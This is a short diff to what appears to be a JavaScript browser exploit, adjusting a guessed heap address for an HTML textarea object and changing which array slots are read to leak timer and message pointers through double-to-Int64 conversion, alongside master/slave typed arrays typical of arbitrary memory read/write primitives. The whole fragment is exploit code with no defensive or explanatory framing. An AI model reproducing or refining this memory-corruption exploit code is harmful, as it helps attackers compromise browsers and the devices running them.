@@ -43,8 +43,6 @@ var g_round = 1;
 var g_input = null;
 
 var guess_htmltextarea_addr = new Int64("0x20a505b48");
-var guess_htmltextarea_addr = new Int64("0x2076dfd80");
-var guess_htmltextarea_addr = new Int64("0x2076dfde0");
 
 var master_b = new Uint32Array(2);
 var slave_b =  new Uint32Array(2);
@@ -436,8 +434,8 @@ function findTargetObj() {
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][3]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][6]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
 				g_round++;
 			}
 
